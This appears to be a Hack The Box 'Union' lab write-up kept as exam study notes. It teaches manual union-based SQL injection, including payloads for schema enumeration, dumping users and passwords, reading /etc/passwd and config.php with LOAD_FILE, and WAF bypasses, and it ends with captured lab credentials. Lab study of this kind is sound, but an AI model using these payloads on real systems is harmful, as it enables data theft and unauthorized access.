HTB Union

Box: Union (Medium)
IP: 10.129.96.75
Vuln: Union-based SQL Injection

Lesson Learned: SQLMap False Negatives

SQLMap returned nothing because the app handled errors the same as "no results." Both returned "Congratulations, you may compete." To detect SQLi you need to start with input that returns data (a known valid player like ippsec) so you can distinguish between a normal response and a broken query.

When ippsec' returned "Congratulations" instead of "Sorry, not eligible," that confirmed the query broke — SQLi confirmed.

Why It Matters for the Exam

Automated tools fail when apps handle errors silently. Always test manually with known valid input first. If the app returns the same response for "not found" and "error," sqlmap can't tell the difference and gives a false negative.

Enumeration Chain (1 Column, Union-Based)

Step 1: Current database
' union select database()-- -

Step 2: All databases
' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA-- -

Step 3: Tables in target database
' union select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='november'-- -

Step 4: Columns in target table
' union select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='flag'-- -

Step 5: Dump the data
' union select group_concat(one) from november.flag-- -

Step 6: Read server files (needs FILE privilege)
' union select LOAD_FILE('/etc/passwd')-- -
' union select LOAD_FILE('/var/www/html/config.php')-- -

Multi-Column Union (e.g., 3 columns, column 2 visible)

Pad non-visible columns with NULL:
' union select NULL,database(),NULL-- -
' union select NULL,group_concat(table_name),NULL from information_schema.tables where table_schema='target_db'-- -

If both columns are visible, use them both:
' union select username,password from users-- -

Key Functions

group_concat() — merges multiple rows into one comma-separated string. Use this almost always.
concat() — merges columns within a single row. Use when group_concat is filtered and you go row by row with LIMIT.
LOAD_FILE() — reads files from the server filesystem. Needs FILE privilege.
database() — returns current database name.
user() — returns current database user.

GROUP_CONCAT vs CONCAT

group_concat(column) — all rows into one string
concat(col1,':',col2) — two columns side by side, one row
group_concat(concat(col1,':',col2)) — both: all rows, columns merged per row

LIMIT for Row-by-Row (when group_concat is filtered)

' union select concat(username,':',password) from users LIMIT 0,1-- -  (row 1)
' union select concat(username,':',password) from users LIMIT 1,1-- -  (row 2)
' union select concat(username,':',password) from users LIMIT 2,1-- -  (row 3)

WAF Bypass Alternatives

SUBSTRING filtered: use MID(), SUBSTR(), LEFT(), RIGHT()
database() filtered: use schema()
spaces filtered: use /**/
OR/AND filtered: use || / &&
= filtered: use LIKE, IN(), BETWEEN
UNION SELECT filtered: try mixed case UnIoN SeLeCt

Attack Path Summary

1. Tested player field with ' OR 1=1-- - on a known valid player (ippsec) — response changed, confirming SQLi
2. Found column count: ' union select 1-- - returned data (1 column)
3. Extracted database name: november
4. Extracted tables: flag, players
5. Extracted columns: flag:one, players:player
6. Dumped flag: UHC{F1rst_5tep_2_Qualify}
7. Used LOAD_FILE to read config.php — found DB creds uhc:uhc-11qual-global-pw
8. SSH'd in with those creds
